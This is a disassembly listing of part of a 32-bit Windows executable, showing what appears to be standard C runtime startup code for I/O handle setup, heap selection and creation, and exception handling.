  405562:	81 7d 9c 00 08 00 00 	cmpl   $0x800,-0x64(%ebp)
  405569:	7d 08                	jge    0x405573
  40556b:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  40556e:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  405571:	eb 07                	jmp    0x40557a
  405573:	c7 45 98 00 08 00 00 	movl   $0x800,-0x68(%ebp)
  40557a:	8b 55 98             	mov    -0x68(%ebp),%edx
  40557d:	89 55 9c             	mov    %edx,-0x64(%ebp)
  405580:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  405587:	eb 09                	jmp    0x405592
  405589:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40558c:	83 c0 01             	add    $0x1,%eax
  40558f:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  405592:	8b 0d 60 f3 45 00    	mov    0x45f360,%ecx
  405598:	3b 4d 9c             	cmp    -0x64(%ebp),%ecx
  40559b:	0f 8d 91 00 00 00    	jge    0x405632
  4055a1:	68 b6 00 00 00       	push   $0xb6
  4055a6:	68 30 f2 40 00       	push   $0x40f230
  4055ab:	6a 02                	push   $0x2
  4055ad:	68 80 04 00 00       	push   $0x480
  4055b2:	e8 29 08 00 00       	call   0x405de0
  4055b7:	83 c4 10             	add    $0x10,%esp
  4055ba:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4055bd:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  4055c1:	75 0b                	jne    0x4055ce
  4055c3:	8b 15 60 f3 45 00    	mov    0x45f360,%edx
  4055c9:	89 55 9c             	mov    %edx,-0x64(%ebp)
  4055cc:	eb 64                	jmp    0x405632
  4055ce:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4055d1:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4055d4:	89 0c 85 60 f2 45 00 	mov    %ecx,0x45f260(,%eax,4)
  4055db:	8b 15 60 f3 45 00    	mov    0x45f360,%edx
  4055e1:	83 c2 20             	add    $0x20,%edx
  4055e4:	89 15 60 f3 45 00    	mov    %edx,0x45f360
  4055ea:	eb 09                	jmp    0x4055f5
  4055ec:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4055ef:	83 c0 24             	add    $0x24,%eax
  4055f2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4055f5:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  4055f8:	8b 14 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%edx
  4055ff:	81 c2 80 04 00 00    	add    $0x480,%edx
  405605:	39 55 b0             	cmp    %edx,-0x50(%ebp)
  405608:	73 23                	jae    0x40562d
  40560a:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40560d:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  405611:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  405614:	c7 01 ff ff ff ff    	movl   $0xffffffff,(%ecx)
  40561a:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40561d:	c6 42 05 0a          	movb   $0xa,0x5(%edx)
  405621:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405624:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40562b:	eb bf                	jmp    0x4055ec
  40562d:	e9 57 ff ff ff       	jmp    0x405589
  405632:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  405639:	eb 1b                	jmp    0x405656
  40563b:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40563e:	83 c1 01             	add    $0x1,%ecx
  405641:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  405644:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405647:	83 c2 01             	add    $0x1,%edx
  40564a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40564d:	8b 45 a0             	mov    -0x60(%ebp),%eax
  405650:	83 c0 04             	add    $0x4,%eax
  405653:	89 45 a0             	mov    %eax,-0x60(%ebp)
  405656:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  405659:	3b 4d 9c             	cmp    -0x64(%ebp),%ecx
  40565c:	7d 67                	jge    0x4056c5
  40565e:	8b 55 a0             	mov    -0x60(%ebp),%edx
  405661:	83 3a ff             	cmpl   $0xffffffff,(%edx)
  405664:	74 5a                	je     0x4056c0
  405666:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405669:	0f be 08             	movsbl (%eax),%ecx
  40566c:	83 e1 01             	and    $0x1,%ecx
  40566f:	85 c9                	test   %ecx,%ecx
  405671:	74 4d                	je     0x4056c0
  405673:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405676:	0f be 02             	movsbl (%edx),%eax
  405679:	83 e0 08             	and    $0x8,%eax
  40567c:	85 c0                	test   %eax,%eax
  40567e:	75 10                	jne    0x405690
  405680:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  405683:	8b 11                	mov    (%ecx),%edx
  405685:	52                   	push   %edx
  405686:	ff 15 8c f0 40 00    	call   *0x40f08c
  40568c:	85 c0                	test   %eax,%eax
  40568e:	74 30                	je     0x4056c0
  405690:	8b 45 a8             	mov    -0x58(%ebp),%eax
  405693:	c1 f8 05             	sar    $0x5,%eax
  405696:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  405699:	83 e1 1f             	and    $0x1f,%ecx
  40569c:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40569f:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  4056a6:	03 d1                	add    %ecx,%edx
  4056a8:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4056ab:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4056ae:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  4056b1:	8b 11                	mov    (%ecx),%edx
  4056b3:	89 10                	mov    %edx,(%eax)
  4056b5:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4056b8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056bb:	8a 11                	mov    (%ecx),%dl
  4056bd:	88 50 04             	mov    %dl,0x4(%eax)
  4056c0:	e9 76 ff ff ff       	jmp    0x40563b
  4056c5:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  4056cc:	eb 09                	jmp    0x4056d7
  4056ce:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4056d1:	83 c0 01             	add    $0x1,%eax
  4056d4:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4056d7:	83 7d a8 03          	cmpl   $0x3,-0x58(%ebp)
  4056db:	0f 8d d3 00 00 00    	jge    0x4057b4
  4056e1:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4056e4:	6b c9 24             	imul   $0x24,%ecx,%ecx
  4056e7:	8b 15 60 f2 45 00    	mov    0x45f260,%edx
  4056ed:	03 d1                	add    %ecx,%edx
  4056ef:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4056f2:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4056f5:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  4056f8:	0f 85 a2 00 00 00    	jne    0x4057a0
  4056fe:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  405701:	c6 41 04 81          	movb   $0x81,0x4(%ecx)
  405705:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  405709:	75 09                	jne    0x405714
  40570b:	c7 45 94 f6 ff ff ff 	movl   $0xfffffff6,-0x6c(%ebp)
  405712:	eb 10                	jmp    0x405724
  405714:	8b 55 a8             	mov    -0x58(%ebp),%edx
  405717:	83 ea 01             	sub    $0x1,%edx
  40571a:	f7 da                	neg    %edx
  40571c:	1b d2                	sbb    %edx,%edx
  40571e:	83 c2 f5             	add    $0xfffffff5,%edx
  405721:	89 55 94             	mov    %edx,-0x6c(%ebp)
  405724:	8b 45 94             	mov    -0x6c(%ebp),%eax
  405727:	50                   	push   %eax
  405728:	ff 15 88 f0 40 00    	call   *0x40f088
  40572e:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  405731:	83 7d b4 ff          	cmpl   $0xffffffff,-0x4c(%ebp)
  405735:	74 58                	je     0x40578f
  405737:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  40573a:	51                   	push   %ecx
  40573b:	ff 15 8c f0 40 00    	call   *0x40f08c
  405741:	89 45 ac             	mov    %eax,-0x54(%ebp)
  405744:	83 7d ac 00          	cmpl   $0x0,-0x54(%ebp)
  405748:	74 45                	je     0x40578f
  40574a:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40574d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  405750:	89 02                	mov    %eax,(%edx)
  405752:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  405755:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40575b:	83 f9 02             	cmp    $0x2,%ecx
  40575e:	75 10                	jne    0x405770
  405760:	8b 55 b0             	mov    -0x50(%ebp),%edx
  405763:	8a 42 04             	mov    0x4(%edx),%al
  405766:	0c 40                	or     $0x40,%al
  405768:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40576b:	88 41 04             	mov    %al,0x4(%ecx)
  40576e:	eb 1d                	jmp    0x40578d
  405770:	8b 55 ac             	mov    -0x54(%ebp),%edx
  405773:	81 e2 ff 00 00 00    	and    $0xff,%edx
  405779:	83 fa 03             	cmp    $0x3,%edx
  40577c:	75 0f                	jne    0x40578d
  40577e:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405781:	8a 48 04             	mov    0x4(%eax),%cl
  405784:	80 c9 08             	or     $0x8,%cl
  405787:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40578a:	88 4a 04             	mov    %cl,0x4(%edx)
  40578d:	eb 0f                	jmp    0x40579e
  40578f:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405792:	8a 48 04             	mov    0x4(%eax),%cl
  405795:	80 c9 40             	or     $0x40,%cl
  405798:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40579b:	88 4a 04             	mov    %cl,0x4(%edx)
  40579e:	eb 0f                	jmp    0x4057af
  4057a0:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4057a3:	8a 48 04             	mov    0x4(%eax),%cl
  4057a6:	80 c9 80             	or     $0x80,%cl
  4057a9:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4057ac:	88 4a 04             	mov    %cl,0x4(%edx)
  4057af:	e9 1a ff ff ff       	jmp    0x4056ce
  4057b4:	a1 60 f3 45 00       	mov    0x45f360,%eax
  4057b9:	50                   	push   %eax
  4057ba:	ff 15 84 f0 40 00    	call   *0x40f084
  4057c0:	8b e5                	mov    %ebp,%esp
  4057c2:	5d                   	pop    %ebp
  4057c3:	c3                   	ret
  4057c4:	cc                   	int3
  4057c5:	cc                   	int3
  4057c6:	cc                   	int3
  4057c7:	cc                   	int3
  4057c8:	cc                   	int3
  4057c9:	cc                   	int3
  4057ca:	cc                   	int3
  4057cb:	cc                   	int3
  4057cc:	cc                   	int3
  4057cd:	cc                   	int3
  4057ce:	cc                   	int3
  4057cf:	cc                   	int3
  4057d0:	55                   	push   %ebp
  4057d1:	8b ec                	mov    %esp,%ebp
  4057d3:	83 ec 08             	sub    $0x8,%esp
  4057d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4057d9:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4057df:	6a 00                	push   $0x0
  4057e1:	ff 15 1c f0 40 00    	call   *0x40f01c
  4057e7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4057ea:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4057ed:	33 d2                	xor    %edx,%edx
  4057ef:	66 8b 11             	mov    (%ecx),%dx
  4057f2:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
  4057f8:	75 09                	jne    0x405803
  4057fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4057fd:	83 78 3c 00          	cmpl   $0x0,0x3c(%eax)
  405801:	75 02                	jne    0x405805
  405803:	eb 23                	jmp    0x405828
  405805:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405808:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40580b:	03 51 3c             	add    0x3c(%ecx),%edx
  40580e:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405811:	8b 45 08             	mov    0x8(%ebp),%eax
  405814:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405817:	8a 51 1a             	mov    0x1a(%ecx),%dl
  40581a:	88 10                	mov    %dl,(%eax)
  40581c:	8b 45 08             	mov    0x8(%ebp),%eax
  40581f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405822:	8a 51 1b             	mov    0x1b(%ecx),%dl
  405825:	88 50 01             	mov    %dl,0x1(%eax)
  405828:	8b e5                	mov    %ebp,%esp
  40582a:	5d                   	pop    %ebp
  40582b:	c3                   	ret
  40582c:	cc                   	int3
  40582d:	cc                   	int3
  40582e:	cc                   	int3
  40582f:	cc                   	int3
  405830:	55                   	push   %ebp
  405831:	8b ec                	mov    %esp,%ebp
  405833:	b8 38 12 00 00       	mov    $0x1238,%eax
  405838:	e8 f3 56 00 00       	call   0x40af30
  40583d:	c7 85 c8 ed ff ff 00 	movl   $0x0,-0x1238(%ebp)
  405844:	00 00 00 
  405847:	c7 85 68 ff ff ff 94 	movl   $0x94,-0x98(%ebp)
  40584e:	00 00 00 
  405851:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  405857:	50                   	push   %eax
  405858:	ff 15 94 f0 40 00    	call   *0x40f094
  40585e:	85 c0                	test   %eax,%eax
  405860:	74 1c                	je     0x40587e
  405862:	83 bd 78 ff ff ff 02 	cmpl   $0x2,-0x88(%ebp)
  405869:	75 13                	jne    0x40587e
  40586b:	83 bd 6c ff ff ff 05 	cmpl   $0x5,-0x94(%ebp)
  405872:	72 0a                	jb     0x40587e
  405874:	b8 01 00 00 00       	mov    $0x1,%eax
  405879:	e9 d2 01 00 00       	jmp    0x405a50
  40587e:	68 90 10 00 00       	push   $0x1090
  405883:	8d 8d d8 ee ff ff    	lea    -0x1128(%ebp),%ecx
  405889:	51                   	push   %ecx
  40588a:	68 54 f2 40 00       	push   $0x40f254
  40588f:	ff 15 90 f0 40 00    	call   *0x40f090
  405895:	85 c0                	test   %eax,%eax
  405897:	0f 84 87 01 00 00    	je     0x405a24
  40589d:	8d 95 d8 ee ff ff    	lea    -0x1128(%ebp),%edx
  4058a3:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4058a6:	eb 09                	jmp    0x4058b1
  4058a8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058ab:	83 c0 01             	add    $0x1,%eax
  4058ae:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4058b1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058b4:	0f be 11             	movsbl (%ecx),%edx
  4058b7:	85 d2                	test   %edx,%edx
  4058b9:	74 25                	je     0x4058e0
  4058bb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058be:	0f be 08             	movsbl (%eax),%ecx
  4058c1:	83 f9 61             	cmp    $0x61,%ecx
  4058c4:	7c 18                	jl     0x4058de
  4058c6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058c9:	0f be 02             	movsbl (%edx),%eax
  4058cc:	83 f8 7a             	cmp    $0x7a,%eax
  4058cf:	7f 0d                	jg     0x4058de
  4058d1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058d4:	8a 11                	mov    (%ecx),%dl
  4058d6:	80 c2 e0             	add    $0xe0,%dl
  4058d9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058dc:	88 10                	mov    %dl,(%eax)
  4058de:	eb c8                	jmp    0x4058a8
  4058e0:	6a 16                	push   $0x16
  4058e2:	8d 8d d8 ee ff ff    	lea    -0x1128(%ebp),%ecx
  4058e8:	51                   	push   %ecx
  4058e9:	68 3c f2 40 00       	push   $0x40f23c
  4058ee:	e8 fd 55 00 00       	call   0x40aef0
  4058f3:	83 c4 0c             	add    $0xc,%esp
  4058f6:	85 c0                	test   %eax,%eax
  4058f8:	75 0e                	jne    0x405908
  4058fa:	8d 95 d8 ee ff ff    	lea    -0x1128(%ebp),%edx
  405900:	89 95 c8 ed ff ff    	mov    %edx,-0x1238(%ebp)
  405906:	eb 73                	jmp    0x40597b
  405908:	68 04 01 00 00       	push   $0x104
  40590d:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  405913:	50                   	push   %eax
  405914:	6a 00                	push   $0x0
  405916:	ff 15 6c f0 40 00    	call   *0x40f06c
  40591c:	8d 8d d4 ed ff ff    	lea    -0x122c(%ebp),%ecx
  405922:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405925:	eb 09                	jmp    0x405930
  405927:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40592a:	83 c2 01             	add    $0x1,%edx
  40592d:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405930:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405933:	0f be 08             	movsbl (%eax),%ecx
  405936:	85 c9                	test   %ecx,%ecx
  405938:	74 25                	je     0x40595f
  40593a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40593d:	0f be 02             	movsbl (%edx),%eax
  405940:	83 f8 61             	cmp    $0x61,%eax
  405943:	7c 18                	jl     0x40595d
  405945:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405948:	0f be 11             	movsbl (%ecx),%edx
  40594b:	83 fa 7a             	cmp    $0x7a,%edx
  40594e:	7f 0d                	jg     0x40595d
  405950:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405953:	8a 08                	mov    (%eax),%cl
  405955:	80 c1 e0             	add    $0xe0,%cl
  405958:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40595b:	88 0a                	mov    %cl,(%edx)
  40595d:	eb c8                	jmp    0x405927
  40595f:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  405965:	50                   	push   %eax
  405966:	8d 8d d8 ee ff ff    	lea    -0x1128(%ebp),%ecx
  40596c:	51                   	push   %ecx
  40596d:	e8 fe 54 00 00       	call   0x40ae70
  405972:	83 c4 08             	add    $0x8,%esp
  405975:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%ebp)
  40597b:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%ebp)
  405982:	0f 84 9c 00 00 00    	je     0x405a24
  405988:	6a 2c                	push   $0x2c
  40598a:	8b 95 c8 ed ff ff    	mov    -0x1238(%ebp),%edx
  405990:	52                   	push   %edx
  405991:	e8 1a 54 00 00       	call   0x40adb0
  405996:	83 c4 08             	add    $0x8,%esp
  405999:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%ebp)
  40599f:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%ebp)
  4059a6:	74 7c                	je     0x405a24
  4059a8:	8b 85 c8 ed ff ff    	mov    -0x1238(%ebp),%eax
  4059ae:	83 c0 01             	add    $0x1,%eax
  4059b1:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%ebp)
  4059b7:	8b 8d c8 ed ff ff    	mov    -0x1238(%ebp),%ecx
  4059bd:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4059c0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4059c3:	0f be 02             	movsbl (%edx),%eax
  4059c6:	85 c0                	test   %eax,%eax
  4059c8:	74 1e                	je     0x4059e8
  4059ca:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4059cd:	0f be 11             	movsbl (%ecx),%edx
  4059d0:	83 fa 3b             	cmp    $0x3b,%edx
  4059d3:	75 08                	jne    0x4059dd
  4059d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059d8:	c6 00 00             	movb   $0x0,(%eax)
  4059db:	eb 09                	jmp    0x4059e6
  4059dd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4059e0:	83 c1 01             	add    $0x1,%ecx
  4059e3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4059e6:	eb d8                	jmp    0x4059c0
  4059e8:	6a 0a                	push   $0xa
  4059ea:	6a 00                	push   $0x0
  4059ec:	8b 95 c8 ed ff ff    	mov    -0x1238(%ebp),%edx
  4059f2:	52                   	push   %edx
  4059f3:	e8 48 50 00 00       	call   0x40aa40
  4059f8:	83 c4 0c             	add    $0xc,%esp
  4059fb:	89 85 d0 ed ff ff    	mov    %eax,-0x1230(%ebp)
  405a01:	83 bd d0 ed ff ff 02 	cmpl   $0x2,-0x1230(%ebp)
  405a08:	74 12                	je     0x405a1c
  405a0a:	83 bd d0 ed ff ff 03 	cmpl   $0x3,-0x1230(%ebp)
  405a11:	74 09                	je     0x405a1c
  405a13:	83 bd d0 ed ff ff 01 	cmpl   $0x1,-0x1230(%ebp)
  405a1a:	75 08                	jne    0x405a24
  405a1c:	8b 85 d0 ed ff ff    	mov    -0x1230(%ebp),%eax
  405a22:	eb 2c                	jmp    0x405a50
  405a24:	8d 85 cc ed ff ff    	lea    -0x1234(%ebp),%eax
  405a2a:	50                   	push   %eax
  405a2b:	e8 a0 fd ff ff       	call   0x4057d0
  405a30:	83 c4 04             	add    $0x4,%esp
  405a33:	8b 8d cc ed ff ff    	mov    -0x1234(%ebp),%ecx
  405a39:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  405a3f:	83 f9 06             	cmp    $0x6,%ecx
  405a42:	7c 07                	jl     0x405a4b
  405a44:	b8 03 00 00 00       	mov    $0x3,%eax
  405a49:	eb 05                	jmp    0x405a50
  405a4b:	b8 02 00 00 00       	mov    $0x2,%eax
  405a50:	8b e5                	mov    %ebp,%esp
  405a52:	5d                   	pop    %ebp
  405a53:	c3                   	ret
  405a54:	cc                   	int3
  405a55:	cc                   	int3
  405a56:	cc                   	int3
  405a57:	cc                   	int3
  405a58:	cc                   	int3
  405a59:	cc                   	int3
  405a5a:	cc                   	int3
  405a5b:	cc                   	int3
  405a5c:	cc                   	int3
  405a5d:	cc                   	int3
  405a5e:	cc                   	int3
  405a5f:	cc                   	int3
  405a60:	55                   	push   %ebp
  405a61:	8b ec                	mov    %esp,%ebp
  405a63:	6a 00                	push   $0x0
  405a65:	68 00 10 00 00       	push   $0x1000
  405a6a:	33 c0                	xor    %eax,%eax
  405a6c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405a70:	0f 94 c0             	sete   %al
  405a73:	50                   	push   %eax
  405a74:	ff 15 9c f0 40 00    	call   *0x40f09c
  405a7a:	a3 4c f2 45 00       	mov    %eax,0x45f24c
  405a7f:	83 3d 4c f2 45 00 00 	cmpl   $0x0,0x45f24c
  405a86:	75 04                	jne    0x405a8c
  405a88:	33 c0                	xor    %eax,%eax
  405a8a:	eb 5f                	jmp    0x405aeb
  405a8c:	e8 9f fd ff ff       	call   0x405830
  405a91:	a3 50 f2 45 00       	mov    %eax,0x45f250
  405a96:	83 3d 50 f2 45 00 03 	cmpl   $0x3,0x45f250
  405a9d:	75 24                	jne    0x405ac3
  405a9f:	68 f8 03 00 00       	push   $0x3f8
  405aa4:	e8 27 18 00 00       	call   0x4072d0
  405aa9:	83 c4 04             	add    $0x4,%esp
  405aac:	85 c0                	test   %eax,%eax
  405aae:	75 11                	jne    0x405ac1
  405ab0:	8b 0d 4c f2 45 00    	mov    0x45f24c,%ecx
  405ab6:	51                   	push   %ecx
  405ab7:	ff 15 98 f0 40 00    	call   *0x40f098
  405abd:	33 c0                	xor    %eax,%eax
  405abf:	eb 2a                	jmp    0x405aeb
  405ac1:	eb 23                	jmp    0x405ae6
  405ac3:	83 3d 50 f2 45 00 02 	cmpl   $0x2,0x45f250
  405aca:	75 1a                	jne    0x405ae6
  405acc:	e8 6f 2d 00 00       	call   0x408840
  405ad1:	85 c0                	test   %eax,%eax
  405ad3:	75 11                	jne    0x405ae6
  405ad5:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  405adb:	52                   	push   %edx
  405adc:	ff 15 98 f0 40 00    	call   *0x40f098
  405ae2:	33 c0                	xor    %eax,%eax
  405ae4:	eb 05                	jmp    0x405aeb
  405ae6:	b8 01 00 00 00       	mov    $0x1,%eax
  405aeb:	5d                   	pop    %ebp
  405aec:	c3                   	ret
  405aed:	cc                   	int3
  405aee:	cc                   	int3
  405aef:	cc                   	int3
  405af0:	56                   	push   %esi
  405af1:	43                   	inc    %ebx
  405af2:	32 30                	xor    (%eax),%dh
  405af4:	58                   	pop    %eax
  405af5:	43                   	inc    %ebx
  405af6:	30 30                	xor    %dh,(%eax)
  405af8:	55                   	push   %ebp
  405af9:	8b ec                	mov    %esp,%ebp
  405afb:	83 ec 08             	sub    $0x8,%esp
  405afe:	53                   	push   %ebx
  405aff:	56                   	push   %esi
  405b00:	57                   	push   %edi
  405b01:	55                   	push   %ebp
  405b02:	fc                   	cld
  405b03:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405b06:	8b 45 08             	mov    0x8(%ebp),%eax
  405b09:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  405b10:	0f 85 82 00 00 00    	jne    0x405b98
  405b16:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b19:	8b 45 10             	mov    0x10(%ebp),%eax
  405b1c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b1f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405b22:	89 43 fc             	mov    %eax,-0x4(%ebx)
  405b25:	8b 73 0c             	mov    0xc(%ebx),%esi
  405b28:	8b 7b 08             	mov    0x8(%ebx),%edi
  405b2b:	83 fe ff             	cmp    $0xffffffff,%esi
  405b2e:	74 61                	je     0x405b91
  405b30:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  405b33:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  405b38:	74 45                	je     0x405b7f
  405b3a:	56                   	push   %esi
  405b3b:	55                   	push   %ebp
  405b3c:	8d 6b 10             	lea    0x10(%ebx),%ebp
  405b3f:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  405b43:	5d                   	pop    %ebp
  405b44:	5e                   	pop    %esi
  405b45:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405b48:	0b c0                	or     %eax,%eax
  405b4a:	74 33                	je     0x405b7f
  405b4c:	78 3c                	js     0x405b8a
  405b4e:	8b 7b 08             	mov    0x8(%ebx),%edi
  405b51:	53                   	push   %ebx
  405b52:	e8 29 d2 ff ff       	call   0x402d80
  405b57:	83 c4 04             	add    $0x4,%esp
  405b5a:	8d 6b 10             	lea    0x10(%ebx),%ebp
  405b5d:	56                   	push   %esi
  405b5e:	53                   	push   %ebx
  405b5f:	e8 5e d2 ff ff       	call   0x402dc2
  405b64:	83 c4 08             	add    $0x8,%esp
  405b67:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  405b6a:	6a 01                	push   $0x1
  405b6c:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  405b70:	e8 e1 d2 ff ff       	call   0x402e56
  405b75:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  405b78:	89 43 0c             	mov    %eax,0xc(%ebx)
  405b7b:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  405b7f:	8b 7b 08             	mov    0x8(%ebx),%edi
  405b82:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  405b85:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  405b88:	eb a1                	jmp    0x405b2b
  405b8a:	b8 00 00 00 00       	mov    $0x0,%eax
  405b8f:	eb 1c                	jmp    0x405bad
  405b91:	b8 01 00 00 00       	mov    $0x1,%eax
  405b96:	eb 15                	jmp    0x405bad
  405b98:	55                   	push   %ebp
  405b99:	8d 6b 10             	lea    0x10(%ebx),%ebp
  405b9c:	6a ff                	push   $0xffffffff
  405b9e:	53                   	push   %ebx
  405b9f:	e8 1e d2 ff ff       	call   0x402dc2
  405ba4:	83 c4 08             	add    $0x8,%esp
  405ba7:	5d                   	pop    %ebp
  405ba8:	b8 01 00 00 00       	mov    $0x1,%eax
  405bad:	5d                   	pop    %ebp
  405bae:	5f                   	pop    %edi
  405baf:	5e                   	pop    %esi
  405bb0:	5b                   	pop    %ebx
  405bb1:	8b e5                	mov    %ebp,%esp
  405bb3:	5d                   	pop    %ebp
  405bb4:	c3                   	ret
  405bb5:	55                   	push   %ebp
  405bb6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  405bba:	8b 29                	mov    (%ecx),%ebp
  405bbc:	8b 41 1c             	mov    0x1c(%ecx),%eax
  405bbf:	50                   	push   %eax
  405bc0:	8b 41 18             	mov    0x18(%ecx),%eax
  405bc3:	50                   	push   %eax
  405bc4:	e8 f9 d1 ff ff       	call   0x402dc2
  405bc9:	83 c4 08             	add    $0x8,%esp
  405bcc:	5d                   	pop    %ebp
  405bcd:	c2 04 00             	ret    $0x4
  405bd0:	55                   	push   %ebp
  405bd1:	8b ec                	mov    %esp,%ebp
  405bd3:	83 3d 70 dc 45 00 01 	cmpl   $0x1,0x45dc70
  405bda:	74 12                	je     0x405bee
  405bdc:	83 3d 70 dc 45 00 00 	cmpl   $0x0,0x45dc70
  405be3:	75 32                	jne    0x405c17
  405be5:	83 3d 64 af 45 00 01 	cmpl   $0x1,0x45af64
  405bec:	75 29                	jne    0x405c17
  405bee:	68 fc 00 00 00       	push   $0xfc
  405bf3:	e8 28 00 00 00       	call   0x405c20
  405bf8:	83 c4 04             	add    $0x4,%esp
  405bfb:	83 3d 2c de 45 00 00 	cmpl   $0x0,0x45de2c
  405c02:	74 06                	je     0x405c0a
  405c04:	ff 15 2c de 45 00    	call   *0x45de2c
  405c0a:	68 ff 00 00 00       	push   $0xff
  405c0f:	e8 0c 00 00 00       	call   0x405c20
  405c14:	83 c4 04             	add    $0x4,%esp
  405c17:	5d                   	pop    %ebp
